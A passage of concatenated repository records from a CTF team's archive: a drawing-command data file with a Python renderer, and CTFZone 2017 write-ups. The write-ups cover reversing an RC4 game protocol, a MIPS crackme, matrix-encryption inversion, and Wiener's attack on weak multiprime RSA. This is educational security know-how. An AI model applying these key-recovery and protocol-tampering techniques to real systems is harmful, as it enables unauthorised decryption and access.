393\nLINE 472 501 456 501\nLINE 612 441 650 441\nLINE 612 629 612 617\nLINE 960 720 0 720\nLINE 368 314 368 308\nLINE 650 243 650 255\n```\n\nIt was quite obvious what to do with this (just draw), but coding python script took dozen of precious minutes (google found nothing, so I guess this was custom format?):\n\n```python\nfrom PIL import Image, ImageDraw\n\nim = Image.new(\"RGB\", (1000, 1000), \"black\")\ndraw = ImageDraw.Draw(im)\n\ndata = open('cmds.txt').read()\ndata = data.split('\\n')\n\nfor l in data:\n    print l\n    cmd = l.split(' ')\n    if cmd[0] == 'LINE':\n        a, b, c, d = cmd[1:]\n        a, b, c, d = int(a), int(b), int(c), int(d)\n        draw.line([(a, b), (c, d)], 'white')\n    elif cmd[0] == 'CRCL':\n        a, b, c = cmd[1:]\n        a, b, c = int(a), int(b), int(c)\n        draw.arc([(a-c, b-c), (a+c, b+c)], 0, 360, 'white')\n    elif cmd[0] == 'RECT':\n        a, b, c, d = cmd[1:]\n        a, b, c, d = int(a), int(b), int(c), int(d)\n        draw.rectangle([(a, b), (c, d)], 'white')\n\nim.save('out.png')\n```\n\nAfter that, we were quite pleased with the result:\n\n![](./out.png)\n", "timestamp": "2025-10-21T13:31:51.124814"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-05-18-confidence-finals/starbyte/cmds.txt", "url": "https://github.com/p4-team/ctf/blob/master/2017-05-18-confidence-finals/starbyte/cmds.txt", "content": "LINE 507 315 509 317\nLINE 364 318 368 314\nLINE 893 354 893 392\nLINE 374 316 376 316\nLINE 429 474 442 460\nLINE 333 632 327 631\nLINE 650 275 650 287\nLINE 484 297 484 296\nLINE 434 314 434 317\nLINE 479 588 486 588\nLINE 330 577 336 552\nLINE 650 569 650 581\nLINE 612 585 650 585\nLINE 672 380 672 366\nLINE 831 355 843 355\nLINE 612 553 650 553\nLINE 751 393 751 355\nLINE 650 537 650 549\nLINE 612 239 612 227\nLINE 565 355 591 336\nLINE 863 355 875 355\nLINE 612 227 650 227\nLINE 638 321 638 335\nLINE 458 588 461 582\nLINE 330 619 285 619\nLINE 430 311 429 311\nLINE 520 319 523 297\nLINE 472 557 472 439\nLINE 612 473 650 473\nLINE 447 310 445 314\nLINE 546 439 564 421\nLINE 686 366 686 380\nLINE 672 336 672 411\nLINE 374 316 376 316\nLINE 827 355 827 393\nLINE 612 631 612 425\nLINE 564 391 590 410\nLINE 650 255 612 255\nLINE 394 313 394 318\nLINE 549 311 549 318\nLINE 650 179 650 191\nLINE 546 557 472 557\nLINE 650 131 650 143\nLINE 763 355 763 393\nLINE 650 537 650 549\nLINE 612 517 612 505\nLINE 520 319 523 297\nLINE 650 321 612 321\nLINE 391 474 377 459\nLINE 402 304 402 309\nLINE 623 424 623 411\nLINE 815 393 815 355\nLINE 650 585 650 597\nLINE 371 313 374 313\nLINE 573 317 573 296\nLINE 612 437 612 425\nLINE 650 211 650 223\nCRCL 437 312 3\nLINE 779 355 779 393\nLINE 783 355 795 355\nLINE 612 501 612 489\nLINE 454 308 454 299\nLINE 589 311 587 320\nLINE 811 393 799 393\nLINE 472 501 456 501\nLINE 612 441 650 441\nLINE 612 629 612 617\nLINE 960 720 0 720\nLINE 368 314 368 308\nLINE 650 243 650 255\nLINE 612 243 650 243\nLINE 735 355 747 355\nLINE 612 597 612 585\nLINE 650 223 612 223\nLINE 650 501 612 501\nLINE 305 652 333 652\nREKT 454 299 10 9\nLINE 383 313 383 317\nLINE 799 393 799 355\nLINE 672 380 672 366\nLINE 815 393 815 355\nLINE 489 303 489 306\nLINE 333 632 327 631\nLINE 549 309 549 308\nLINE 267 436 263 435\nLINE 612 489 650 489\nLINE 650 517 612 517\nLINE 650 505 650 517\nLINE 650 291 650 303\nLINE 461 581 474 581\nLINE 412 304 412 301\nCRCL 560 314 5\nLINE 475 582 478 588\nLINE 423 313 425 315\nLINE 508 311 505 310\nLINE 279 645 285 645\nLINE 358 318 363 318\nLINE 549 318 549 311\nLINE 650 581 612 581\nLINE 419 312 419 319\nLINE 612 307 650 307\nLINE 416 307 419 311\nLINE 427 322 423 321\nLINE 368 307 364 303\nLINE 431 404 454 419\nLINE 893 392 687 392\nLINE 285 619 285 576\nLINE 263 447 267 448\nLINE 623 424 623 411\nLINE 264 459 264 466\nLINE 612 631 612 425\nLINE 533 299 548 298\nLINE 650 613 612 613\nLINE 831 355 843 355\nLINE 484 296 507 296\nLINE 650 115 650 127\nLINE 719 355 731 355\nREKT 266 428 82 123\nLINE 687 355 699 355\nLINE 650 195 650 207\nLINE 501 312 502 314\nLINE 410 318 408 318\nLINE 458 588 461 582\nLINE 650 473 650 485\nLINE 290 169 293 198\nLINE 799 355 811 355\nLINE 650 453 612 453\nLINE 650 485 612 485\nLINE 507 296 507 297\nLINE 827 393 815 393\nLINE 478 614 486 606\nLINE 612 179 650 179\nLINE 612 163 650 163\nLINE 330 393 285 393\nLINE 650 239 612 239\nLINE 475 582 478 588\nLINE 715 393 703 393\nLINE 289 652 304 652\nLINE 875 393 863 393\nLINE 612 207 612 195\nLINE 506 320 502 320\nLINE 448 321 451 321\nLINE 650 163 650 175\nLINE 434 314 434 317\nLINE 410 520 410 539\nLINE 612 569 650 569\nLINE 687 393 687 355\nLINE 612 159 612 147\nLINE 496 319 495 319\nLINE 650 259 650 271\nLINE 364 493 383 493\nLINE 879 393 879 355\nLINE 623 411 638 411\nLINE 462 308 466 320\nLINE 650 307 650 319\nLINE 589 311 587 320\nLINE 612 425 650 425\nLINE 879 393 879 355\nLINE 703 355 715 355\nLINE 650 585 650 597\nLINE 650 581 612 581\nLINE 650 319 612 319\nLINE 589 306 595 307\nLINE 410 520 410 539\nLINE 501 319 501 318\nLINE 612 501 612 489\nLINE 501 319 501 318\nLINE 811 355 811 393\nLINE 612 533 612 521\nLINE 348 552 267 552\nLINE 431 404 454 419\nLINE 650 569 650 581\nLINE 687 392 687 354\nLINE 505 309 502 309\nLINE 348 321 267 321\nLINE 650 319 612 319\nLINE 531 576 531 619\nLINE 358 302 358 318\nLINE 612 303 612 291\nLINE 431 320 429 322\nLINE 612 319 612 307\nLINE 650 115 650 321\nLINE 508 307 517 307\nLINE 650 159 612 159\nLINE 521 312 529 312\nLINE 514 320 515 319\nLINE 419 307 416 307\nLINE 612 321 612 115\nLINE 487 576 472 557\nREKT 348 565 93 64\nLINE 442 607 457 607\nLINE 612 131 650 131\nLINE 419 307 416 307\nLINE 327 631 327 620\nLINE 735 393 735 355\nLINE 612 581 612 569\nLINE 489 303 489 306\nLINE 612 163 650 163\nLINE 795 393 783 393\nLINE 422 299 420 307\nLINE 283 94 328 94\nLINE 447 310 445 314\nLINE 612 147 650 147\nLINE 428 316 430 317\nLINE 0 720 0 0\nLINE 612 275 650 275\nLINE 286 645 289 651\nLINE 426 309 424 310\nLINE 767 393 767 355\nLINE 612 211 650 211\nLINE 612 255 612 243\nLINE 650 127 612 127\nLINE 612 425 650 425\nLINE 521 312 529 312\nLINE 389 313 384 313\nLINE 412 314 411 317\nLINE 612 453 612 441\nLINE 612 223 612 211\nLINE 799 355 811 355\nLINE 650 533 612 533\nLINE 612 287 612 275\nLINE 650 629 612 629\nLINE 262 538 262 541\nLINE 508 311 505 310\nLINE 455 484 471 484\nLINE 478 614 486 606\nLINE 612 565 612 553\nLINE 549 318 549 318\nREKT 286 350 43 43\nLINE 650 597 612 597\nLINE 650 521 650 533\nLINE 612 505 650 505\nLINE 444 317 447 320\nLINE 374 313 374 318\nLINE 650 631 612 631\nLINE 612 191 612 179\nLINE 612 115 650 115\nLINE 286 412 293 416\nLINE 847 393 847 355\nLINE 430 311 429 311\nLINE 638 335 623 335\nLINE 650 255 612 255\nLINE 524 296 532 319\nLINE 467 308 454 308\nLINE 377 315 379 314\nLINE 612 585 650 585\nLINE 504 314 505 314\nLINE 279 615 279 645\nLINE 334 652 334 633\nLINE 453 326 563 326\nLINE 391 512 378 525\nLINE 612 127 612 115\nLINE 294 333 267 322\nLINE 421 538 421 564\nLINE 437 320 437 320\nLINE 767 355 779 355\nLINE 650 441 650 453\nLINE 612 629 612 617\nLINE 650 617 650 629\nLINE 699 355 699 393\nLINE 650 303 612 303\nLINE 430 405 349 405\nLINE 650 175 612 175\nLINE 612 437 612 425\nLINE 429 310 427 310\nLINE 612 287 612 275\nLINE 650 207 612 207\nLINE 328 94 328 169\nLINE 612 175 612 163\nLINE 416 446 416 405\nLINE 285 393 285 350\nLINE 893 354 893 392\nLINE 783 355 795 355\nLINE 573 296 582 318\nLINE 612 115 650 115\nLINE 612 453 612 441\nLINE 458 607 462 614\nLINE 348 485 366 485\nLINE 612 565 612 553\nLINE 779 355 779 393\nLINE 650 271 612 271\nLINE 505 309 502 309\nLINE 612 581 612 569\nLINE 330 606 348 606\nLINE 715 355 715 393\nREKT 591 336 81 75\nLINE 323 393 323 427\nLINE 847 355 859 355\nLINE 863 393 863 355\nLINE 368 307 364 303\nLINE 795 355 795 393\nLINE 687 354 893 354\nLINE 612 159 612 147\nLINE 506 320 502 320\nLINE 573 317 573 296\nLINE 487 576 472 557\nLINE 430 317 430 319\nLINE 444 314 444 316\nLINE 859 393 847 393\nLINE 731 355 731 393\nLINE 638 424 623 424\nLINE 267 197 348 197\nLINE 441 631 349 631\nLINE 650 489 650 501\nLINE 263 459 263 446\nLINE 267 457 264 459\nLINE 394 313 394 318\nLINE 389 313 384 313\nLINE 330 351 350 340\nLINE 454 304 454 321\nLINE 650 613 612 613\nLINE 410 466 410 446\nLINE 426 309 424 310\nLINE 763 355 763 393\nLINE 783 393 783 355\nLINE 843 355 843 393\nLINE 612 549 612 537\nLINE 267 541 259 541\nLINE 612 143 612 131\nLINE 453 419 453 326\nLINE 429 310 427 310\nLINE 638 321 638 335\nLINE 815 355 827 355\nLINE 650 147 650 159\nLINE 612 533 612 521\nLINE 650 437 612 437\nLINE 263 459 263 446\nLINE 411 300 405 300\nLINE 650 489 650 501\nLINE 686 380 672 380\nLINE 650 553 650 565\nLINE 323 350 323 333\nLINE 407 318 404 318\nLINE 488 313 488 318\nLINE 650 287 612 287\nLINE 783 393 783 355\nLINE 486 576 531 576\nLINE 612 469 612 457\nLINE 402 446 402 405\nLINE 507 315 509 317\nLINE 330 394 349 405\nLINE 847 393 847 355\nLINE 687 393 687 355\nLINE 612 617 650 617\nLINE 412 304 412 301\nLINE 650 115 650 127\nLINE 293 350 293 334\nLINE 349 339 430 339\nLINE 719 355 731 355\nLINE 289 652 304 652\nLINE 402 309 412 310\nLINE 859 355 859 393\nLINE 371 313 374 313\nLINE 540 309 545 312\nLINE 264 467 267 465\nLINE 612 275 650 275\nLINE 843 393 831 393\nLINE 429 512 442 525\nLINE 548 298 537 320\nLINE 549 311 549 311\nLINE 550 308 550 309\nLINE 427 322 423 321\nLINE 863 393 863 355\nLINE 549 311 549 318\nLINE 650 271 612 271\nLINE 424 311 424 313\nLINE 286 404 286 411\nLINE 394 313 396 313\nLINE 368 314 368 308\nLINE 612 207 612 195\nLINE 650 163 650 175\nLINE 612 195 650 195\nREKT 285 577 44 43\nLINE 330 351 350 340\nLINE 364 318 368 314\nLINE 650 291 650 303\nLINE 612 537 650 537\nLINE 437 493 456 493\nLINE 735 355 747 355\nLINE 612 521 650 521\nLINE 612 211 650 211\nLINE 407 318 404 318\nLINE 612 243 650 243\nLINE 595 308 590 310\nLINE 847 355 859 355\nLINE 612 549 612 537\nLINE 389 318 389 325\nLINE 612 115 650 115\nLINE 262 538 262 541\nLINE 482 299 488 303\nLINE 424 311 424 313\nLINE 563 326 563 419\nLINE 454 299 467 299\nLINE 496 298 496 319\nLINE 589 306 595 307\nLINE 348 501 363 501\nLINE 612 473 650 473\nLINE 391 512 378 525\nLINE 267 321 267 197\nLINE 891 355 891 393\nLINE 437 493 456 493\nLINE 293 350 293 334\nLINE 583 318 583 297\nLINE 573 296 582 318\nLINE 650 307 650 319\nLINE 402 539 402 564\nLINE 591 336 672 336\nLINE 394 313 396 313\nLINE 672 411 591 411\nLINE 285 615 280 615\nLINE 767 393 767 355\nLINE 410 318 408 318\nLINE 687 354 893 354\nLINE 731 355 731 393\nLINE 612 521 650 521\nLINE 612 425 650 425\nLINE 650 207 612 207\nLINE 795 393 783 393\nLINE 441 565 441 631\nLINE 650 321 612 321\nLINE 650 501 612 501\nLINE 811 393 799 393\nLINE 843 393 831 393\nLINE 612 227 650 227\nLINE 448 321 451 321\nLINE 612 307 650 307\nLINE 472 439 453 420\nLINE 533 299 548 298\nLINE 672 366 686 366\nREKT 454 325 109 95\nLINE 540 309 545 312\nLINE 391 474 377 459\nLINE 650 159 612 159\nLINE 623 335 623 321\nLINE 392 313 393 313\nLINE 437 320 437 320\nLINE 267 457 264 459\nLINE 294 400 286 404\nLINE 419 312 419 319\nLINE 549 311 549 311\nLINE 431 320 429 322\nLINE 779 393 767 393\nLINE 501 309 501 311\nLINE 411 300 405 300\nLINE 548 298 537 320\nLINE 451 309 447 309\nLINE 612 223 612 211\nLINE 650 227 650 239\nLINE 612 425 650 425\nLINE 489 307 483 309\nLINE 286 412 293 416\nLINE 364 493 383 493\nLINE 323 350 323 333\nLINE 396 313 398 318\nLINE 650 553 650 565\nLINE 501 312 502 314\nLINE 549 308 550 308\nLINE 396 313 398 318\nLINE 495 298 496 298\nLINE 489 307 483 309\nLINE 383 318 388 318\nLINE 863 355 875 355\nLINE 815 355 827 355\nLINE 799 393 799 355\nLINE 550 308 550 309\nLINE 612 597 612 585\nLINE 263 539 263 542\nLINE 612 303 612 291\nLINE 330 590 349 590\nLINE 612 469 612 457\nLINE 879 355 891 355\nLINE 479 588 486 588\nLINE 293 416 293 428\nLINE 703 355 715 355\nLINE 612 271 612 259\nLINE 524 296 532 319\nLINE 650 457 650 469\nLINE 495 319 495 298\nLINE 715 393 703 393\nLINE 294 394 294 400\nLINE 893 392 687 392\nLINE 263 539 263 542\nCRCL 411 492 47\nLINE 591 411 591 336\nLINE 747 393 735 393\nLINE 349 405 349 339\nLINE 488 319 476 321\nLINE 484 296 507 296\nLINE 650 631 612 631\nLINE 429 512 442 525\nLINE 612 441 650 441\nLINE 612 255 612 243\nLINE 612 489 650 489\nLINE 323 333 348 321\nLINE 612 271 612 259\nLINE 412 314 411 317\nLINE 264 467 267 465\nLINE 731 393 719 393\nLINE 404 301 402 304\nLINE 455 484 471 484\nLINE 612 175 612 163\nLINE 0 0 960 0\nLINE 467 299 467 308\nREKT 487 575 45 47\nLINE 495 319 495 298\nLINE 612 553 650 553\nLINE 430 317 430 319\nLINE 389 325 383 321\nLINE 859 393 847 393\nLINE 549 309 549 308\nLINE 392 313 393 313\nLINE 496 319 495 319\nLINE 751 393 751 355\nLINE 650 179 650 191\nLINE 279 645 285 645\nLINE 423 313 425 315\nLINE 377 315 379 314\nLINE 435 319 436 320\nLINE 328 169 283 169\nLINE 650 243 650 255\nLINE 334 652 334 633\nLINE 323 393 323 427\nLINE 650 143 612 143\nLINE 461 581 474 581\nLINE 650 549 612 549\nLINE 412 311 412 314\nLINE 549 318 549 318\nLINE 513 302 513 319\nLINE 550 309 549 309\nLINE 650 303 612 303\nLINE 763 393 751 393\nLINE 650 227 650 239\nLINE 279 615 279 645\nLINE 650 549 612 549\nLINE 687 355 699 355\nLINE 650 127 612 127\nLINE 504 314 505 314\nLINE 612 517 612 505\nLINE 686 380 672 380\nLINE 262 435 262 447\nLINE 612 115 650 115\nLINE 431 338 454 326\nLINE 402 539 402 564\nLINE 650 597 612 597\nLINE 650 629 612 629\nLINE 612 143 612 131\nLINE 650 239 612 239\nLINE 612 485 612 473\nLINE 482 310 487 313\nLINE 484 297 484 296\nLINE 509 318 507 320\nLINE 383 318 388 318\nLINE 444 317 447 320\nLINE 650 517 612 517\nLINE 595 308 590 310\nLINE 349 565 441 565\nLINE 699 393 687 393\nLINE 290 169 293 198\nLINE 349 631 349 565\nLINE 650 191 612 191\nLINE 703 393 703 355\nLINE 960 0 960 720\nLINE 650 457 650 469\nLINE 612 319 612 307\nLINE 264 459 264 466\nLINE 286 404 286 411\nLINE 426 316 428 316\nLINE 612 613 612 601\nLINE 563 419 453 419\nLINE 482 310 487 313\nLINE 444 314 444 316\nLINE 426 316 428 316\nLINE 442 588 458 588\nLINE 330 577 336 552\nLINE 650 275 650 287\nLINE 650 565 612 565\nLINE 623 411 638 411\nLINE 586 294 588 306\nLINE 612 505 650 505\nLINE 612 291 650 291\nLINE 509 318 507 320\nLINE 586 294 588 306\nLINE 430 339 430 405\nLINE 472 439 546 439\nLINE 438 320 441 320\nLINE 514 320 515 319\nLINE 672 366 686 366\nLINE 564 391 590 410\nLINE 650 223 612 223\nLINE 638 335 623 335\nLINE 650 175 612 175\nLINE 875 355 875 393\nLINE 462 615 477 615\nLINE 650 211 650 223\nLINE 383 313 383 317\nLINE 330 394 349 405\nLINE 650 425 650 631\nLINE 623 335 623 321\nLINE 549 318 549 311\nLINE 650 565 612 565\nLINE 476 299 482 299\nLINE 285 350 330 350\nLINE 323 333 348 321\nLINE 404 319 402 316\nLINE 795 355 795 393\nLINE 285 576 330 576\nLINE 751 355 763 355\nLINE 402 446 402 405\nLINE 831 393 831 355\nLINE 719 393 719 355\nLINE 305 652 333 652\nLINE 875 393 863 393\nLINE 565 355 591 336\nLINE 348 428 348 552\nLINE 699 355 699 393\nLINE 612 127 612 115\nLINE 891 393 879 393\nLINE 612 485 612 473\nLINE 330 590 349 590\nLINE 612 617 650 617\nLINE 546 439 546 557\nLINE 612 601 650 601\nLINE 811 355 811 393\nLINE 650 143 612 143\nLINE 513 302 513 319\nLINE 348 197 348 321\nLINE 293 416 293 428\nLINE 612 131 650 131\nLINE 438 320 441 320\nLINE 422 299 420 307\nLINE 402 309 412 310\nLINE 650 147 650 159\nLINE 612 191 612 179\nLINE 650 425 650 437\nLINE 612 569 650 569\nLINE 442 607 457 607\nLINE 779 393 767 393\nLINE 451 309 447 309\nLINE 267 436 263 435\nLINE 363 302 359 302\nLINE 612 601 650 601\nLINE 612 457 650 457\nLINE 327 631 327 620\nLINE 476 299 482 299\nLINE 612 259 650 259\nLINE 348 485 366 485\nLINE 703 393 703 355\nLINE 404 301 402 304\nLINE 507 296 507 297\nLINE 638 411 638 424\nLINE 428 316 430 317\nLINE 612 239 612 227\nLINE 404 319 402 316\nLINE 410 466 410 446\nLINE 612 457 650 457\nLINE 472 501 456 501\nLINE 330 576 330 619\nLINE 501 309 501 311\nLINE 638 411 638 424\nLINE 650 425 650 631\nLINE 612 179 650 179\nLINE 650 601 650 613\nLINE 482 299 488 303\nLINE 507 297 484 297\nLINE 285 577 278 552\nLINE 650 469 612 469\nLINE 462 615 477 615\nLINE 747 393 735 393\nLINE 472 439 453 420\nLINE 767 355 779 355\nLINE 507 297 484 297\nREKT 275 124 56 45\nLINE 358 302 358 318\nLINE 421 538 421 564\nLINE 612 321 612 115\nLINE 374 313 374 318\nLINE 416 446 416 405\nLINE 318 197 322 169\nLINE 650 469 612 469\nLINE 891 355 891 393\nLINE 875 355 875 393\nLINE 389 318 389 314\nLINE 495 298 496 298\nLINE 363 302 359 302\nLINE 612 537 650 537\nLINE 488 313 488 318\nREKT 350 339 80 65\nLINE 751 355 763 355\nLINE 731 393 719 393\nLINE 719 393 719 355\nLINE 612 195 650 195\nLINE 389 325 383 321\nLINE 891 393 879 393\nLINE 650 437 612 437\nLINE 402 304 402 309\nLINE 650 617 650 629\nLINE 508 307 517 307\nLINE 286 645 289 651\nLINE 442 588 458 588\nLINE 431 338 454 326\nLINE 267 552 267 428\nLINE 650 191 612 191\nLINE 267 428 348 428\nLINE 389 318 389 325\nLINE 462 308 466 320\nLINE 285 577 278 552\nLINE 650 601 650 613\nLINE 623 321 638 321\nLINE 412 311 412 314\nLINE 827 355 827 393\nLINE 612 613 612 601\nLINE 650 115 650 321\nLINE 416 307 419 311\nLINE 389 318 389 314\nLINE 843 355 843 393\nLINE 715 355 715 393\nLINE 263 447 267 448\nLINE 348 501 363 501\nLINE 650 521 650 533\nLINE 650 533 612 533\nLINE 486 619 486 576\nLINE 650 287 612 287\nLINE 330 606 348 606\nLINE 294 333 267 322\nLINE 747 355 747 393\nLINE 827 393 815 393\nLINE 650 485 612 485\nLINE 650 259 650 271\nLINE 859 355 859 393\nLINE 650 505 650 517\nLINE 496 298 496 319\nREKT 470 439 78 118\nLINE 735 393 735 355\nLINE 583 318 583 297\nLINE 650 473 650 485\nLINE 330 350 330 393\nLINE 650 195 650 207\nLINE 358 318 363 318\nLINE 429 474 442 460\nLINE 531 619 486 619\nLINE 549 308 550 308\nLINE 879 355 891 355\nCRCL 410 493 27\nLINE 294 394 294 400\nLINE 488 319 476 321\nLINE 550 309 549 309\nLINE 687 392 687 354\nLINE 763 393 751 393\nLINE 612 259 650 259\nLINE 638 424 623 424\nLINE 831 393 831 355\nLINE 623 321 638 321\nLINE 686 366 686 380\nLINE 283 169 283 94\nLINE 612 147 650 147\nLINE 285 615 280 615\nLINE 650 441 650 453\nLINE 294 400 286 404\nLINE 612 291 650 291\nLINE 699 393 687 393\nLINE 546 439 564 421\nLINE 650 425 650 437\nLINE 532 577 545 558\nLINE 458 607 462 614\nLINE 532 577 545 558\nLINE 435 319 436 320\nLINE 262 435 262 447\nLINE 747 355 747 393\nLINE 267 541 259 541\nLINE 650 453 612 453\nLINE 650 131 650 143\nLINE 454 304 454 321\nREKT 266 198 83 123\nLINE 318 197 322 169\n", "timestamp": "2025-10-21T13:31:51.216629"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/README.md", "content": "# Writeup CTFZone 2017 Quals\n\nTeam: akrasuski1, msm, nazywam, rev, c7f.m0d3, cr019283, shalom\n\n![](ctfzone.png)\n\n### Table of contents\n\n* [battleships (ppc / re)](battleships)\n* [crackme3000 (re)](crackme3000)\n* [decrypt_the_undecryptable (re)](decrypt_the_undecryptable)\n* [fireplace (re)](fireplace)\n* [paged_out (misc/forensics)](paged_out)\n* [mprsa (crypto)](mprsa)\n", "timestamp": "2025-10-21T13:31:52.132741"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/battleships/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/battleships/README.md", "content": "# Battleships (reverse, ppc, 872p)\n\n> A perfect candidate should be a strong leader, excellent negotiator and outstanding commander. Among his qualities must be strategic thinking and battle skills.Campaign office reports that large naval exercise will take place in the neighbouring city where anyone could try himself as an admiral and fight against famous admiral Odin.This naval exercise is a perfect chance to show the superiority of our candidate over the others. We must make provision for the victory of the leader who would lead our nation to a better future. However, your team had to face unexpected difficulties – your vessels look like they are from Middle Ages while the vessels of your enemy are state-of-the-art fire ships that DESTROYS EVERYTHING AROUND. After this, it is not a surprise that the radar in your command center is not working partially and targeting system is messed up. And what is more – you suspect that your team’s first assistance is Odin’s spy…\n> All the indications are that this exercise is organized by your rivals in order to tar your candidate’s reputation. Cheer up! Victory in such an uphill battle will show the strength and genius of your candidate – go for it!\n\n> battleships\n\n> nc 82.202.212.28:1337\n\nIn this task we were given a binary, which turns out to be a command line client for playing battleships\ngame with a server (hardcoded in the binary to localhost, but we patched it to use supplied IP).\n\nThe game is pretty normal: first you set your ships' positions on a 10x10 board (4 single-tile ones, 3 double, 2 triple\nand 1 four-tile vessel). Then, after completing a simple proof of work, the game starts and you can guess where\ncomputer's ships are.\n\nAfter writing a simple Python script intrerfacing with the binary, using simple strategies (guessing randomly or \nsequentially, i.e. a1, a2, a3...), we found out the server has only single-tiled ships - or at least we didn't\nsink any bigger ones in dozens of games. Still, it didn't seem we could win the game just like that, it would be too simple.\n\nAfter disassembling and reverse engineering the binary, we found out the client communicates with the server using\ncustom protocol. All messages are encrypted using RC4, but we know the key as it's sent in plaintext on the wire.\nApart from the encryption part, the protocol is quite simple - you can send position which you want to target as\nbyte `x*16+y` and server responds with hit or miss and other, less relevant data. We implemented the protocol in\nPython and played a lot more of games. After collecting a nice statistical sample of hundreds of games, we noticed two\npatterns in hit positions.\n\nFirst, enemy ships never touched each other, even though our ships were allowed to be placed in that way. In the \nhindsight, this was hinted in the task description (that enemy vessels destroy everything around). We implemented that\nimprovement in the code (so that we never try to shoot near sunk ships), but this still wasn't enough to win the game.\n\nThe second observation we made was that all the ships we sunk were in the left 7 columns of the board. Although we\noften shot the rightmost columns too, they never resulted in successful hit. After reading the description again,\nwe deduced this might be because of `our targeting system being messed up`. In other words, our board view was stretched\nin the X direction. If that was the case, maybe the Y axis was stretched too? Indeed, when we allowed our script\nto shoot on Y=11, there were some hits.\n\nIn the end, we changed the board size to 7x14 (notice `7*14 == 98`, remarkably close to 100), which allowed us to\nwin the game after a couple of tries.\n", "timestamp": "2025-10-21T13:31:52.384428"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/crackme3000/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/crackme3000/README.md", "content": "# Crackme3000 (reverse, 724p)\n\n> Our opponents have set up a private email server to store their correspondence.\n> We need to gain access to it. Could you break their advanced authentication protocols?\n\n> crackme3000\n\nIn this task we were given a single MIPS binary. It wasn't too big, but reversing it was still painful. Architecture\nis not widely supported by RE tools, but task creators were actively trying to mislead us. For example,\nthe congratulations text was printed in two cases: either the input string was equal to some hardcoded\nstring formatted like a flag (which BTW was not the flag), or when a series of checks were fulfilled.\n\nThe binary used RC4 cipher as a part of password checking. Finding the key was tricky though - it turned out\nto be the string `error: _ptr is not null` - yeah, seriously! I initially skipped that part of binary,\nthinking it's just random compiler error checking subroutine. Nice idea for delaying the reversing.\n\nThe binary then tried to open some file, but didn't seem to do anything with it. Then it decrypted some data using\nRC4 and xored it with `xor_key` buffer. The problem is, that buffer was set only if the operation of opening that file\ndid not succeed. The `xor_key` was then set to the result of `strerror` function call - as I guessed, \nLinux-like `No such file or directory` error message. Combining all this together, we wrote a quick script to get the flag.\n\nThis was a really cleverly annoying task. What a weird combination.\n", "timestamp": "2025-10-21T13:31:52.616608"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/fireplace/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/fireplace/README.md", "content": "# Fireplace (reverse, ppc, 763p)\n\n> As it is in love and war, all is fair during the elections, especially when it comes to an opportunity to get rid of a candidate who is three points ahead of you. Your secret agent in this candidate’s campaign office informed you of some secret documents which prove that your rival is guilty of bribery. Unfortunately, one of his assistants noticed these documents and threw it into the fireplace before leaving the office, but your agent managed to damp down the fire and grab the pieces. Restore the document and help you candidate to win!\n\n> fireplace.tar\n\nIn this task we were given a binary and a random-looking BMP picture. The binary accepted a single command line \nargument - filename. When given any BMP picture, it would encrypt it somehow and overwrite the original picture.\n\nReverse engineering the binary showed it generates an internal square picture using Windows standard `rand` function\nfor pixel values. The input image, when interpreted as a matrix of 24-bit RGB values is then multiplied (as in\nmatrix multiplication) with that square image and saved as the output. All operations are done modulo `2**24`.\n\nSo, we get the following equation: `Input * Square = Output`. Since we know the Output matrix (it's the \nrandom-looking BMP) and Square (Windows `rand` is deterministic - LCG), we can multiply both sides of the equation\nby modular inverse of Square matrix to get: `Input = Output * modinv(Square)`. We implemented this in mixture\nof Python and Sage and retrieved the original image.\n", "timestamp": "2025-10-21T13:31:52.908348"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-07-15-ctfzone/mprsa/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-07-15-ctfzone/mprsa/README.md", "content": "# MPRSA (crypto)\n\n## ENG\n[PL](#pl-version)\n\nIn the task we get [RSA public key components](public.txt), [encrypted flag](data.enc) and [source code](mprsa.py) used for encryption.\nThe code contains a classic multiprime RSA implementation, with an interesting key generation code:\n\n```python\ndef key_gen(self, bits, prime_numbers=4):\n\tdelta = randint(5, 15)\n\tbit_prime = int(bits // prime_numbers)\n\n\tP = [next_prime(number.getPrime(bit_prime) + 1)]\n\tfor i in range(1, prime_numbers):\n\t\tP.append(next_prime(P[i - 1] * delta))\n\n\tn = self.__compute_module(P)\n\tphi = self.__compute_phi(P)\n\n\tfor d_next in count(int(pow(P[0] // 2, 0.5)), -1):\n\t\tg, e, __ = gcdext(d_next, phi)\n\t\tif (1 < e < n) and (g == 1) and (gcd(phi, e) == 1):\n\t\t\td = d_next\n\t\t\tbreak\n\n\tself.public_key = (e, n)\n\tself.secret_key = (d, n)\n```\n\nThe initiall issue we noticed with this code, is that modulus `n` is composed of strongly non-random primes, since `.next_prime` is deterministic and `delta` multiplier is very small.\nWe've seen some writeups for this task which attacked this vector.\n\nNevertheless, we have a bit of experience already with attacks on RSA and we've noticed one other interesting fact here:\n\n```python\nfor d_next in count(int(pow(P[0] // 2, 0.5)), -1):\n```\n\nPrivate key exponents starts from `sqrt(p1/2)` and we know that p1 is the smallest of the primes in `n` and they are of similar size, therefore `p1` is smaller than `n^(1/4)`.\n\nAnd we know that if `d < 1/3 n^(1/4)` then we can use Wiener's attack to recover the private exponent.\nIt's clear that we are lucky and we can recover the key with a bit of sage:\n\n```python\ne = 29682820371003536403751378991097904999839045103722521237263722001368664539600171513344694542196185302523263913163680893370625133602073812021919154734629354771375234559632500565616966646678265208971453268822429325096369243169938163825039626493021078654222042924906599611231033220818522404379786131213657810169884482113213494699410084795978084711021648201731399191108606764645335061474557129459611472971934256034661856657722199284972586187544928594885898739060430038858935719624335095105686178989561351348018939526712898958412020799070233828791763534478454319803397637018450659329674926131741499482951786586327443379845980331997169096096919170915993330324215155845907674343167393742770089766240919292633132940179582035019626099864287345531442078413759159760373493855256857657518254355837007257106526181072506343734247135132982010177681738788698031697810153372834903197563985781090784823687252060201867611618846504131822978771511061352328382717859942759153106628583294770839145899174313430362669264365354060782